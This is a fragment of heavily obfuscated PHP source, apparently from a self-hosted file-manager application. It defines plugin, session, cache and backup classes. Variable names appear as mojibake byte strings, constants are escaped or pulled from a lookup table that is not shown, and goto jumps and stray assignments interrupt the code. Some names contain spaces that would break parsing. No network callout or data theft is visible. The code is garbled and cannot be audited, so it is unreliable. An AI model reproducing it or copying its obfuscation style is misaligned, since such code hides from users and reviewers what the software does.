} class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\160\154\165\147\x69\156\114\x69\163\164"; public $field = array("\x6e\x61\155\145", "\x73\164\141\x74\x75\163", "\x72\x65\147\151\145\163\164", "\x63\x6f\156\146\151\x67"); public function loadList($·Ã¢ªœ = false) { $•­¹£ø = array_to_keyvalue($this->listData(), $_SERVER[ÏéâËõ‘][32]); if ($·Ã¢ªœ) { return $•­¹£ø[$·Ã¢ªœ]; } return $•­¹£ø; } public function init() { $åü÷¿¹Ê =& $_SERVER[ÏéâËõ‘]; Hook::trigger($åü÷¿¹Ê[1954]); $£™°–İÖ = $this->loadPluginList(); foreach ($£™°–İÖ as $ÄâÊÎÇ  => $·šû‡½İ) { $××³üÛ§ = $this->appAllow($ÄâÊÎÇ , $·šû‡½İ); if (!$××³üÛ§) { continue; } foreach ($·šû‡½İ[$åü÷¿¹Ê[1955]] as $íüĞ£Ì½ => $ö¥û¤Òò) { Hook::bind($íüĞ£Ì½, $ö¥û¤Òò); } } Hook::trigger($åü÷¿¹Ê[1956]); Hook::trigger(ACTION); } public function appAllow($àëºÎ, $İÒîù—», $ö¨é¡šì = true) { $Ğöı…‘ı =& $_SERVER[ÏéâËõ‘]; $Ş•Ó÷áõ = PLUGIN_DIR . $àëºÎ . $Ğöı…‘ı[1957]; if (!is_array($İÒîù—») || !is_array($İÒîù—»[$Ğöı…‘ı[1955]]) || $İÒîù—»[$Ğöı…‘ı[752]] != 1 || !is_file($Ş•Ó÷áõ)) { return !1; } if ($GLOBALS[$Ğöı…‘ı[503]] == 1) { if ($GLOBALS[$Ğöı…‘ı[6]][$Ğöı…‘ı[1958]] || !$GLOBALS[$Ğöı…‘ı[6]][$Ğöı…‘ı[1959]]) { return !0; } $ËÎ±øÓ = explode($Ğöı…‘ı[50], strtolower($GLOBALS[$Ğöı…‘ı[6]][$Ğöı…‘ı[1959]])); return in_array(strtolower($àëºÎ), $ËÎ±øÓ) ? !1 : !0; } if ($ö¨é¡šì && !Action($Ğöı…‘ı[1960])->checkAuth($àëºÎ)) { return !1; } return !0; } public function unInstall($¶ä“—‹û) { $Ù£Å¡éö =& $_SERVER[ÏéâËõ‘]; $˜ïï¼’´ = $this->loadList($¶ä“—‹û); if (file_exists(PLUGIN_DIR . $¶ä“—‹û)) { Hook::apply($¶ä“—‹û . $Ù£Å¡éö[1961]); } $this->remove($˜ïï¼’´[$Ù£Å¡éö[399]]); } public function changeStatus($“õ¶º¼“, $µ·Ò¤‰å) { $ŒÆ¥İÉö =& $_SERVER[ÏéâËõ‘]; $ûŸë‚ğ = $this->loadList($“õ¶º¼“); if ($µ·Ò¤‰å) { Hook::apply($“õ¶º¼“ . $ŒÆ¥İÉö[1962]); } $this->update($ûŸë‚ğ[$ŒÆ¥İÉö[399]], array($ŒÆ¥İÉö[1963] => $µ·Ò¤‰å)); } public function appRegist($ş×¿Ø“ò, $“µ¿ˆêÓ) { $»ÍÇáı =& $_SERVER[ÏéâËõ‘]; $…Ì¹©µÙ = $this->loadList($ş×¿Ø“ò); if ($…Ì¹©µÙ) { $this->update($…Ì¹©µÙ[$»ÍÇáı[399]], array($»ÍÇáı[1955] => $“µ¿ˆêÓ)); } else { $•ÖÑÃÛ— = array($»ÍÇáı[32] => $ş×¿Ø“ò, $»ÍÇáı[1955] => $“µ¿ˆêÓ, $»ÍÇáı[752] => 0, $»ÍÇáı[6] => $this->getConfigDefault($ş×¿Ø“ò)); $this->insert($•ÖÑÃÛ—); } } public function getConfigDefault($¸÷®Ôùæ) { $ë¼ÖÃ—³ =& $_SERVER[ÏéâËõ‘]; $ÇïĞñæ… = array(); $‘Óå¤ø = $this->getPackageJson($¸÷®Ôùæ); if (!$‘Óå¤ø && is_array($‘Óå¤ø[$ë¼ÖÃ—³[1964]])) { return $ÇïĞñæ…; } foreach ($‘Óå¤ø[$ë¼ÖÃ—³[1964]] as $Ç¨¢¥Ø  => $°ƒî¹¹ã) { if (!isset($°ƒî¹¹ã[$ë¼ÖÃ—³[374]]) || isset($ÇïĞñæ…[$Ç¨¢¥Ø ])) { continue; } $ÇïĞñæ…[$Ç¨¢¥Ø ] = $°ƒî¹¹ã[$ë¼ÖÃ—³[374]]; } return $ÇïĞñæ…; } public function getPackageJson($Ï›à‰èã) { return Hook::apply($Ï›à‰èã . $_SERVER[ÏéâËõ‘][1965]); } public function getConfig($ƒåµéäŒ, $ìšŞ›úØ = false) { $©•–†¼ =& $_SERVER[ÏéâËõ‘]; $¼©…éµ¶ = array(); $ì•˜ı”Ü = $this->loadList($ƒåµéäŒ); if ($ì•˜ı”Ü && is_array($ì•˜ı”Ü[$©•–†¼[6]])) { $¼©…éµ¶ = $ì•˜ı”Ü[$©•–†¼[6]]; } if (!$¼©…éµ¶ || $ìšŞ›úØ) { $¼©…éµ¶ = $this->getConfigDefault($ƒåµéäŒ); } return $¼©…éµ¶; } public function setConfig($ìÂÖÉå‚, $è–ªŸœ™ = false) { $±ª‰ÍŞö =& $_SERVER[ÏéâËõ‘]; $Å™úœÃ = $this->loadList($ìÂÖÉå‚); if (!$Å™úœÃ) { return !1; } $ø›¢ñ” = $Å™úœÃ[$±ª‰ÍŞö[6]]; if ($è–ªŸœ™ == !1) { $ø›¢ñ” = array(); $è–ªŸœ™ = $this->getConfigDefault($ìÂÖÉå‚); } foreach ($è–ªŸœ™ as $şÑÎ­­© => $ûÂÉõıİ) { $ø›¢ñ”[$şÑÎ­­©] = is_string($ûÂÉõıİ) ? trim($ûÂÉõıİ) : $ûÂÉõıİ; } $this->update($Å™úœÃ[$±ª‰ÍŞö[399]], array($±ª‰ÍŞö[6] => $ø›¢ñ”)); } public function viewList() { $äÈï¦å =& $_SERVER[ÏéâËõ‘]; $â—õå± = $this->loadList(); $this->pluginScan($â—õå±); $â—õå± = $this->loadPluginList(); $¢õŞ¼ = array(); foreach ($â—õå± as $âàæêÙĞ => $ââÁ¤¶‰) { unset($ââÁ¤¶‰[$äÈï¦å[1955]], $ââÁ¤¶‰[$äÈï¦å[6]]); $Æ§ÕäÅ‹ = PLUGIN_DIR . $ââÁ¤¶‰[$äÈï¦å[32]] . $äÈï¦å[1957]; if (!is_file($Æ§ÕäÅ‹)) { continue; } $ÁÇ»·©Í = Hook::apply($ââÁ¤¶‰[$äÈï¦å[32]] . $äÈï¦å[1965]); if (is_array($ÁÇ»·©Í)) { $¢õŞ¼[$âàæêÙĞ] = array_merge($ââÁ¤¶‰, $ÁÇ»·©Í); } } return $¢õŞ¼; } private function loadPluginList() { $âœå¶£± =& $_SERVER[ÏéâËõ‘]; $Òóßó¢ = $this->loadList(); if (strtolower(MOD) == $âœå¶£±[1966]) { return $Òóßó¢; } $”è‹×˜ = Hook::trigger($âœå¶£±[1967], $Òóßó¢); if ($Òóßó¢ && !$”è‹×˜) { die; } return $”è‹×˜ ? $”è‹×˜ : $Òóßó¢; } private function pluginScan($Ì³†ü€’) { $õÁİ•±ù =& $_SERVER[ÏéâËõ‘]; recursion_dir(PLUGIN_DIR, $ƒˆğ‹¡ˆ, $å†¾ƒ±, 0); foreach ($ƒˆğ‹¡ˆ as $¼ìÎ»˜š) { $³õ¯×Ñİ = get_path_this($¼ìÎ»˜š); if (isset($Ì³†ü€’[$³õ¯×Ñİ]) || !file_exists($¼ìÎ»˜š . $õÁİ•±ù[1968]) || !file_exists($¼ìÎ»˜š . $õÁİ•±ù[1957])) { continue; } Hook::apply($³õ¯×Ñİ . $õÁİ•±ù[1962]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\155\137\x73\x65\x73\163\x69\157\156"; public function get($ôŞôÍú) { $ÌÇä =& $_SERVER[ÏéâËõ‘]; $ÀÜÀ×ú = $this->where(array($ÌÇä[1969] => $ôŞôÍú))->find(); if (!is_array($ÀÜÀ×ú)) { return !1; } return $ÀÜÀ×ú[$ÌÇä[757]]; } public function set($ÍÛË¢Ÿµ, $’÷ò‚Œß, $†¸òË© = 3600) { $»İÙ¥¹ =& $_SERVER[ÏéâËõ‘]; $¢ÕÚ™¯ú = array($»İÙ¥¹[1969] => $ÍÛË¢Ÿµ, $»İÙ¥¹[1873] => $’÷ò‚Œß, $»İÙ¥¹[1970] => $†¸òË© + time()); if (Session::get($»İÙ¥¹[1971])) { $¢ÕÚ™¯ú[$»İÙ¥¹[1662]] = Session::get($»İÙ¥¹[1971]); } else { $¢ÕÚ™¯ú[$»İÙ¥¹[1662]] = 0; } if ($this->get($ÍÛË¢Ÿµ)) { return $this->where(array($»İÙ¥¹[1969] => $ÍÛË¢Ÿµ))->save($¢ÕÚ™¯ú); } else { return $this->add($¢ÕÚ™¯ú, array(), !0); } } public function remove($…õ§‡’) { return $this->where(array($_SERVER[ÏéâËõ‘][1969] => $…õ§‡’))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ÏéâËõ‘][1972] . time())->delete(); } } goto FŠ‡†‰Å…Æ; dÕ…ğ±Ï¡‰: function binCheckBigger($¾­‘ğôß, $Ïëİ­ú‚) { return $¾­‘ğôß > $Ïëİ­ú‚; } $_SERVER[$_SERVER[ûˆ¼±‹ù][3]] = ("\70\61\60\61".base64_decode('NDQ='))+0;$_4eo5="lqr5j8yu1v6t7dgwaneb0fx3zipkm9chos247m0q4glb16wxuhoj9tiar8cnpdye5kz2s";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¹ß†í, $ŠåÁ©«) { $µ§ é¤• =& $_SERVER[ÏéâËõ‘]; if (isset(self::$_methodList[$¹ß†í])) { return @call_user_func_array(self::$_methodList[$¹ß†í], $ŠåÁ©«); } else { if (method_exists($this, $¹ß†í)) { return call_user_func_array(array($this, $¹ß†í), $ŠåÁ©«); } else { think_exception(__CLASS__ . $µ§ é¤•[4] . $¹ß†í . $µ§ é¤•[5]); } } } public static function __callStatic($«—ÑûË¬, $Ì¡Æá–¦) { if (isset(self::$_methodListStatic[$«—ÑûË¬])) { return call_user_func_array(self::$_methodListStatic[$«—ÑûË¬], $Ì¡Æá–¦); } else { if (method_exists(self, $«—ÑûË¬)) { return call_user_func_array(array(self, $«—ÑûË¬), $Ì¡Æá–¦); } else { show_json("{$«—ÑûË¬}\50\51\x20\x6e\157\164\x20\x65\170\x69\x73\164\x3b", !1); } } } public static function addMethod($¢»šï÷Ø, $ê×ÊÏ–¢) { self::$_methodList[$¢»šï÷Ø] = $ê×ÊÏ–¢; } public static function addMethodStatic($¦Ÿı”§Ó, $ê‡¸³ƒÖ) { self::$_methodListStatic[$¦Ÿı”§Ó] = $ê‡¸³ƒÖ; } } goto D¶ÂÍ‡ƒË¡; Fà›œ¬Ÿİï: class BackupFile { public function __construct() { } public function index() { $Ş´ç‘ã = Backup::get(); $½‰á½ = $Ş´ç‘ã[$_SERVER[ÏéâËõ‘][293]][$_SERVER[ÏéâËõ‘][199]][$_SERVER[ÏéâËõ‘][468]]; $±”†ÍÙü = array($_SERVER[ÏéâËõ‘][469] => array($_SERVER[ÏéâËõ‘][809], $½‰á½), $_SERVER[ÏéâËõ‘][810] => array($_SERVER[ÏéâËõ‘][331], $Ş´ç‘ã[$_SERVER[ÏéâËõ‘][754]])); $ß§îó¯¾ = (int) Model($_SERVER[ÏéâËõ‘][791])->where($±”†ÍÙü)->count($_SERVER[ÏéâËõ‘][468]); $“áÏ ¬® = (int) Model($_SERVER[ÏéâËõ‘][791])->where($±”†ÍÙü)->sum($_SERVER[ÏéâËõ‘][76]); $ÉÖùé¼• = new TaskFileTransfer($_SERVER[ÏéâËõ‘][811], $_SERVER[ÏéâËõ‘][782], $ß§îó¯¾, LNG($_SERVER[ÏéâËõ‘][783]) . $_SERVER[ÏéâËõ‘][784] . LNG($_SERVER[ÏéâËõ‘][812])); $ÉÖùé¼•->task[$_SERVER[ÏéâËõ‘][765]] = $“áÏ ¬®; $ŸÖ¹õÜ¬ = array($_SERVER[ÏéâËõ‘][813] => $ß§îó¯¾, $_SERVER[ÏéâËõ‘][814] => $“áÏ ¬®, $_SERVER[ÏéâËõ‘][815] => time()); Backup::set($ŸÖ¹õÜ¬); $ÛÔ˜Äï = !0; $›ã³ºİæ = $this->storeIds(); $üÍ«Ş—¢ = 1; $·Á¯ïñˆ = 1000; $üÈ—ø¶ù = $İÅØ™¿Ì = 0; $ù³ãÓí½ = array(); $¬â†•¹Ù = $é Ç©ìƒ = 0; do { $‚±æÍ¬ì = $_SERVER[ÏéâËõ‘][816]; $ê÷ËÏÔ = Model($_SERVER[ÏéâËõ‘][791])->where($±”†ÍÙü)->field($‚±æÍ¬ì)->order($_SERVER[ÏéâËõ‘][817])->selectPage($·Á¯ïñˆ, $üÍ«Ş—¢); $Àúã…ü = !empty($ê÷ËÏÔ[$_SERVER[ÏéâËõ‘][369]]) ? $ê÷ËÏÔ[$_SERVER[ÏéâËõ‘][369]] : array(); foreach ($Àúã…ü as $ô„ò¯”) { if (!$this->_fileExist($ô„ò¯”, $ù³ãÓí½, $›ã³ºİæ)) { $ß§îó¯¾ -= 1; $“áÏ ¬® -= (int) $ô„ò¯”[$_SERVER[ÏéâËõ‘][76]]; write_log("\x66\151\154\x65\x20\156\157\164\40\x65\x78\151\x73\164\x2e\146\151\154\x65\x49\104\72{$ô„ò¯”[$_SERVER[ÏéâËõ‘][468]]}\x2c\40\160\141\164\x68\72{$ô„ò¯”[$_SERVER[ÏéâËõ‘][84]]}", $_SERVER[ÏéâËõ‘][818]); continue; } $ÌÍŞ­…” = $ô„ò¯”[$_SERVER[ÏéâËõ‘][84]]; $øÂøóÁ = "\173\151\x6f\x3a{$Ş´ç‘ã[$_SERVER[ÏéâËõ‘][754]]}\x7d" . substr($ÌÍŞ­…”, strlen("\x7b\151\x6f\72{$ô„ò¯”[$_SERVER[ÏéâËõ‘][819]]}\175")); if (IO::exist($øÂøóÁ)) { $ÉÖùé¼•->updateFileEnd($ô„ò¯”[$_SERVER[ÏéâËõ‘][32]], $ô„ò¯”[$_SERVER[ÏéâËõ‘][76]]); } else { $øÂøóÁ = get_path_father($øÂøóÁ); IO::mkdir($øÂøóÁ); if (!IO::copy($ÌÍŞ­…”, $øÂøóÁ, $_SERVER[ÏéâËõ‘][820])) { write_log($_SERVER[ÏéâËõ‘][821] . $ÌÍŞ­…” . $_SERVER[ÏéâËõ‘][805] . $øÂøóÁ . $_SERVER[ÏéâËõ‘][164], $_SERVER[ÏéâËõ‘][782]); $ÛÔ˜Äï = !1; break; } } $½‰á½ = $ô„ò¯”[$_SERVER[ÏéâËõ‘][468]]; $İÅØ™¿Ì += 1; $üÈ—ø¶ù += $ô„ò¯”[$_SERVER[ÏéâËõ‘][76]]; $é Ç©ìƒ += 1; $¬â†•¹Ù += $ô„ò¯”[$_SERVER[ÏéâËõ‘][76]]; if ($üÈ—ø¶ù >= 1024 * 1024 * 100) { $ŸÖ¹õÜ¬ = array($_SERVER[ÏéâËõ‘][822] => $½‰á½, $_SERVER[ÏéâËõ‘][823] => $é Ç©ìƒ, $_SERVER[ÏéâËõ‘][824] => $¬â†•¹Ù); Backup::set($ŸÖ¹õÜ¬); $üÈ—ø¶ù = $İÅØ™¿Ì = 0; } } $Ÿ˜“ıÃÜ = count($Àúã…ü); $üÍ«Ş—¢++; } while ($Ÿ˜“ıÃÜ == $·Á¯ïñˆ); $ÉÖùé¼•->end(); $ŸÖ¹õÜ¬ = array($_SERVER[ÏéâËõ‘][825] => 1, $_SERVER[ÏéâËõ‘][497] => time(), $_SERVER[ÏéâËõ‘][777] => 1, $_SERVER[ÏéâËõ‘][822] => $½‰á½, $_SERVER[ÏéâËõ‘][814] => $“áÏ ¬®, $_SERVER[ÏéâËõ‘][813] => $ß§îó¯¾, $_SERVER[ÏéâËõ‘][826] => time()); if ($İÅØ™¿Ì) { $ŸÖ¹õÜ¬[$_SERVER[ÏéâËõ‘][823]] = $é Ç©ìƒ; $ŸÖ¹õÜ¬[$_SERVER[ÏéâËõ‘][824]] = $¬â†•¹Ù; } Backup::set($ŸÖ¹õÜ¬); $this->_fileFilter($ù³ãÓí½); return !0; } private function _fileExist($˜­¹ß™ò, &$ÉÕ•êÁØ, $±œ»ìşæ) { $ˆ¤ÅÃÔà =& $_SERVER[ÏéâËõ‘]; $Ğ‹ËîÜ× = $˜­¹ß™ò[$ˆ¤ÅÃÔà[84]]; if (in_array($˜­¹ß™ò[$ˆ¤ÅÃÔà[468]], $ÉÕ•êÁØ)) { return !1; } if (!in_array($˜­¹ß™ò[$ˆ¤ÅÃÔà[819]], $±œ»ìşæ)) { return !1; } if (IO::exist($Ğ‹ËîÜ×)) { return !0; } $Áæá×´ = get_path_father($Ğ‹ËîÜ×); if (IO::exist($Áæá×´)) { $ÉÕ•êÁØ[] = $˜­¹ß™ò[$ˆ¤ÅÃÔà[468]]; return !1; } $ˆ°Òó»† = array($ˆ¤ÅÃÔà[819] => $˜­¹ß™ò[$ˆ¤ÅÃÔà[819]], $ˆ¤ÅÃÔà[84] => array($ˆ¤ÅÃÔà[383], "{$Áæá×´}\x25")); $–³¿‰Ô = Model($ˆ¤ÅÃÔà[791])->where($ˆ°Òó»†)->field($ˆ¤ÅÃÔà[469])->select(); $ÉÕ•êÁØ = array_merge($ÉÕ•êÁØ, array_to_keyvalue($–³¿‰Ô, $ˆ¤ÅÃÔà[12], $ˆ¤ÅÃÔà[468])); return !1; } private function _fileFilter($Ø²€€´) { $€ÃŒšñè =& $_SERVER[ÏéâËõ‘]; if (empty($Ø²€€´)) { return; } $„©õëïÌ = array($€ÃŒšñè[468] => array($€ÃŒšñè[7], array_unique($Ø²€€´))); $¡„ŠÄ¿µ = Model($€ÃŒšñè[827])->where($„©õëïÌ)->field($€ÃŒšñè[402])->select(); foreach ($¡„ŠÄ¿µ as $¯ÔÊá) { Model($€ÃŒšñè[827])->remove($¯ÔÊá[$€ÃŒšñè[402]], !1); } } private function storeIds() { $öÈáÎƒÃ =& $_SERVER[ÏéâËõ‘]; $¸†ÀŒ = Model($öÈáÎƒÃ[769])->listData(); $¡ç¹àºõ = array(); $ÑŠ¢Í = $GLOBALS[$öÈáÎƒÃ[6]][$öÈáÎƒÃ[89]][$öÈáÎƒÃ[828]]; foreach ($¸†ÀŒ as $»©ì¤‘³) { $â†‹›´æ = strtolower($»©ì¤‘³[$öÈáÎƒÃ[95]]); if (!isset($ÑŠ¢Í[$â†‹›´æ])) { continue; } $¬Õ¥”—³ = $öÈáÎƒÃ[74] . (isset($ÑŠ¢Í[$â†‹›´æ]) ? $ÑŠ¢Í[$â†‹›´æ] : ucfirst($â†‹›´æ)); if (!class_exists($¬Õ¥”—³)) { continue; } $¡ç¹àºõ[] = $»©ì¤‘³[$öÈáÎƒÃ[399]]; } return $¡ç¹àºõ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $Î¨şŸûÖ =& $_SERVER[ÏéâËõ‘]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $´î¹Ùô© = $GLOBALS[$Î¨şŸûÖ[6]][$Î¨şŸûÖ[349]]; $ûÑ£½…ü = $´î¹Ùô©[$´î¹Ùô©[$Î¨şŸûÖ[829]]]; $İô›·´‡ = $´î¹Ùô©[$Î¨şŸûÖ[830]]; switch ($´î¹Ùô©[$Î¨şŸûÖ[829]]) { case $Î¨şŸûÖ[21]: self::$handle = Model($Î¨şŸûÖ[831]); break; case $Î¨şŸûÖ[832]: self::$handle = new CacheRedis($ûÑ£½…ü, $İô›·´‡); break; case $Î¨şŸûÖ[833]: self::$handle = new CacheMemcached($ûÑ£½…ü, $İô›·´‡); break; case $Î¨şŸûÖ[199]: self::$handle = new CacheFile($ûÑ£½…ü, $İô›·´‡); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($¨õÖ¹í›) { if (is_array($¨õÖ¹í›) || is_object($¨õÖ¹í›)) { $¨õÖ¹í› = json_encode($¨õÖ¹í›); } $¨õÖ¹í› = rawurlencode($¨õÖ¹í›); return md5(KOD_SITE_ID . $_SERVER[ÏéâËõ‘][11] . $¨õÖ¹í›); } public static function get($ÖÀ¶ë¿ş, $ÑÄáû³Ú = false) { $ñ¹Ê†ĞÚ = self::key($ÖÀ¶ë¿ş); if ($ÑÄáû³Ú) { return unserialize(self::init()->get($ñ¹Ê†ĞÚ)); } if (!isset(self::$memoryCache[$ñ¹Ê†ĞÚ])) { $ˆú¦€ = self::init()->get($ñ¹Ê†ĞÚ); self::$memoryCache[$ñ¹Ê†ĞÚ] = unserialize($ˆú¦€); } return self::$memoryCache[$ñ¹Ê†ĞÚ]; } public static function set($Éï®òñ—, $ƒìŠÊé…, $ÒéĞ’åå = false) { $«ÏÄéÀ = self::key($Éï®òñ—); if (isset(self::$memoryCache[$«ÏÄéÀ]) && self::$memoryCache[$«ÏÄéÀ] === $ƒìŠÊé…) { return !0; } if ($ÒéĞ’åå === 0) { self::$memoryCache[$«ÏÄéÀ] = $ƒìŠÊé…; return !0; } CacheLock::lock($Éï®òñ—); $îøäˆº‡ = self::init()->set($«ÏÄéÀ, serialize($ƒìŠÊé…), $ÒéĞ’åå); self::$memoryCache[$«ÏÄéÀ] = $ƒìŠÊé…; CacheLock::unlock($Éï®òñ—); return $îøäˆº‡; } public static function getCall($¾æ•õ, $šœÒÌ«, $ÙÌë›Ó, $´À¥¹ƒ = array()) { $î­Ääó½ =& $_SERVER[ÏéâËõ‘]; $ªĞˆüÔÜ = self::get($¾æ•õ); if ($ªĞˆüÔÜ || $ªĞˆüÔÜ === $î­Ääó½[12]) { return $ªĞˆüÔÜ; } $ªĞˆüÔÜ = call_user_func_array($ÙÌë›Ó, $´À¥¹ƒ); $ªĞˆüÔÜ = $ªĞˆüÔÜ ? $ªĞˆüÔÜ : $î­Ääó½[12]; self::set($¾æ•õ, $ªĞˆüÔÜ, $šœÒÌ«); return $ªĞˆüÔÜ; } public static function remove($‹éñ¸“‰) { $û»àæÖö = self::key($‹éñ¸“‰); unset(self::$memoryCache[$û»àæÖö]); self::clearTimeout(); CacheLock::lock($‹éñ¸“‰); $í»¹À‡ˆ = self::init()->remove($û»àæÖö); CacheLock::unlock($‹éñ¸“‰); return $í»¹À‡ˆ; } public static function removeMemory($œ‰îâšÖ) { $Úª®ãä– = self::key($œ‰îâšÖ); unset(self::$memoryCache[$Úª®ãä–]); } public static function clearMemory($ÀóµÓ—ˆ = false) { if ($ÀóµÓ—ˆ) { $ÀóµÓ—ˆ = self::key($ÀóµÓ—ˆ); unset(self::$memoryCache[$ÀóµÓ—ˆ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ÏéâËõ‘][834])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ÏéâËõ‘][835])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($œ‘œü€, $¹±Üı„²) { $€æ®®„ =& $_SERVER[ÏéâËõ‘]; $this->cachePath = $œ‘œü€[$€æ®®„[84]]; $this->prefix = $€æ®®„[836]; $this->cacheTime = $¹±Üı„²; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($•‘ãÁ§”) { $ ¬è¸Ïî =& $_SERVER[ÏéâËõ‘]; $•‘ãÁ§” = str_replace(array($ ¬è¸Ïî[837], $ ¬è¸Ïî[97], $ ¬è¸Ïî[73]), $ ¬è¸Ïî[838], $•‘ãÁ§”); return $this->cachePath . $ ¬è¸Ïî[839] . $•‘ãÁ§” . $ ¬è¸Ïî[840]; } public function set($›…Û±, $¾÷Ô²™, $»˜¹¼¥¨ = false) { $ŞªàéáÅ = $this->getFile($›…Û±); if (file_put_contents($ŞªàéáÅ, $this->prefix . $¾÷Ô²™, LOCK_EX)) { @touch($ŞªàéáÅ, intval(time() + $»˜¹¼¥¨)); clearstatcache(); return !0; } @unlink($ŞªàéáÅ); return !1; } public function get($†ÂêŒÇ®) { $¥–ÎÚµª = $this->getFile($†ÂêŒÇ®); if (file_exists($¥–ÎÚµª) && filemtime($¥–ÎÚµª) < time()) { @unlink($¥–ÎÚµª); return !1; } $™ ¢¸—¯ = @file_get_contents($¥–ÎÚµª); return substr($™ ¢¸—¯, strlen($this->prefix)); } public function remove($çüà¥œï) { $ÑûËÑ¬¡ = $this->getFile($çüà¥œï); return @unlink($ÑûËÑ¬¡); } public function deleteAll() { $àÉİÙ‚í =& $_SERVER[ÏéâËõ‘]; $õÇÜò¸ = scandir($this->cachePath); foreach ($õÇÜò¸ as $£¬¾Û©õ) { $ÓË€ç¥ç = $this->cachePath . $£¬¾Û©õ; if (strpos($ÓË€ç¥ç, $àÉİÙ‚í[840]) && strpos($ÓË€ç¥ç, $àÉİÙ‚í[841])) { @unlink($ÓË€ç¥ç); } } } public function clearTimeout() { $ëÉã½Á¯ =& $_SERVER[ÏéâËõ‘]; $Ô°Úãîñ = scandir($this->cachePath); foreach ($Ô°Úãîñ as $œ³”™ä–) { $áËÏïÈä = $this->cachePath . $œ³”™ä–; if (strpos($áËÏïÈä, $ëÉã½Á¯[840]) && strpos($áËÏïÈä, $ëÉã½Á¯[841]) && filemtime($áËÏïÈä) < time()) { @unlink($áËÏïÈä); } } } } goto d£é¯õ¼ƒ¢; FÇÉÂ‘²¼‡: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¤’¢Ó£Â =& $_SERVER[ÏéâËõ‘]; $this->isManual(); self::$name = date($¤’¢Ó£Â[750]); if (!($¶§·«¡ = Model($¤’¢Ó£Â[751])->lastItem())) { $¶§·«¡ = $this->initData(); } else { self::$name = $¶§·«¡[$¤’¢Ó£Â[32]]; if ($¶§·«¡[$¤’¢Ó£Â[752]] == $¤’¢Ó£Â[88]) { self::$name = date($¤’¢Ó£Â[753]); $ô·¦Û«ü = 0; if (isset($¶§·«¡[$¤’¢Ó£Â[293]][$¤’¢Ó£Â[199]][$¤’¢Ó£Â[468]])) { $ô·¦Û«ü = (int) $¶§·«¡[$¤’¢Ó£Â[293]][$¤’¢Ó£Â[199]][$¤’¢Ó£Â[468]]; } if (self::$manual == 0 && $¶§·«¡[$¤’¢Ó£Â[32]] == self::$name) { Model($¤’¢Ó£Â[751])->remove($¶§·«¡[$¤’¢Ó£Â[399]]); } $¶§·«¡ = $this->initData($ô·¦Û«ü, $¶§·«¡[$¤’¢Ó£Â[754]]); } else { $this->checkStore($¶§·«¡[$¤’¢Ó£Â[754]]); } } self::$option = $¶§·«¡; } private function isManual() { $Ñ¿¹ªùÒ = _get($GLOBALS, $_SERVER[ÏéâËõ‘][755], 0); $Ñ¿¹ªùÒ = intval($Ñ¿¹ªùÒ); self::$manual = $Ñ¿¹ªùÒ && $Ñ¿¹ªùÒ == 1 ? 1 : 0; } private function initData($¿èæ•ãã = 0, $¡ëó¨ıĞ = '') { $´£Ë‰ ® =& $_SERVER[ÏéâËõ‘]; $œ·ÁŒì÷ = Model($´£Ë‰ ®[751])->config(); if ($¡ëó¨ıĞ && $œ·ÁŒì÷[$´£Ë‰ ®[754]] != $¡ëó¨ıĞ) { $¿èæ•ãã = 0; } $this->checkStore($œ·ÁŒì÷[$´£Ë‰ ®[754]]); if (self::$manual == 1) { self::$name .= $´£Ë‰ ®[11] . date($´£Ë‰ ®[756]); } $È‡‘¾â¥ = array($´£Ë‰ ®[754] => $œ·ÁŒì÷[$´£Ë‰ ®[754]], $´£Ë‰ ®[32] => self::$name, $´£Ë‰ ®[752] => 0, $´£Ë‰ ®[757] => $œ·ÁŒì÷[$´£Ë‰ ®[757]], $´£Ë‰ ®[758] => self::$manual, $´£Ë‰ ®[293] => array($´£Ë‰ ®[759] => array($´£Ë‰ ®[752] => 0), $´£Ë‰ ®[760] => array($´£Ë‰ ®[752] => 0, $´£Ë‰ ®[761] => 0, $´£Ë‰ ®[762] => 0, $´£Ë‰ ®[33] => $´£Ë‰ ®[12], $´£Ë‰ ®[763] => 0, $´£Ë‰ ®[497] => 0), $´£Ë‰ ®[764] => array($´£Ë‰ ®[752] => 0, $´£Ë‰ ®[761] => 0, $´£Ë‰ ®[762] => 0, $´£Ë‰ ®[763] => 0, $´£Ë‰ ®[497] => 0), $´£Ë‰ ®[199] => array($´£Ë‰ ®[752] => 0, $´£Ë‰ ®[765] => 0, $´£Ë‰ ®[766] => 0, $´£Ë‰ ®[767] => 0, $´£Ë‰ ®[768] => 0, $´£Ë‰ ®[468] => $¿èæ•ãã, $´£Ë‰ ®[763] => 0, $´£Ë‰ ®[497] => 0)), $´£Ë‰ ®[763] => time(), $´£Ë‰ ®[497] => 0); $ïÓã÷úá = Model($´£Ë‰ ®[751])->insert($È‡‘¾â¥); $È‡‘¾â¥[$´£Ë‰ ®[399]] = $ïÓã÷úá; return $È‡‘¾â¥; } private function checkStore($Ï¢ãË¬Ü) { $ó›ò¨á™ =& $_SERVER[ÏéâËõ‘]; $ì¶ÒÑˆÑ = Model($ó›ò¨á™[769])->listData($Ï¢ãË¬Ü); Model($ó›ò¨á™[769])->checkConfig($ì¶ÒÑˆÑ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ÏéâËõ‘][751])->findByName(self::$name); } return self::$option; } public static function set($‚Éë—•°) { $îÃ‹Æçü =& $_SERVER[ÏéâËõ‘]; $ûíÉé¯» = self::get(); foreach ($‚Éë—•° as $ˆ¢Òøø© => $Ä£·å„¶) { $¥‡ç•åş = explode($îÃ‹Æçü[10], $ˆ¢Òøø©); $í’óíµ = count($¥‡ç•åş); switch ($í’óíµ) { case 1: $ûíÉé¯»[$¥‡ç•åş[0]] = $Ä£·å„¶; break; case 2: 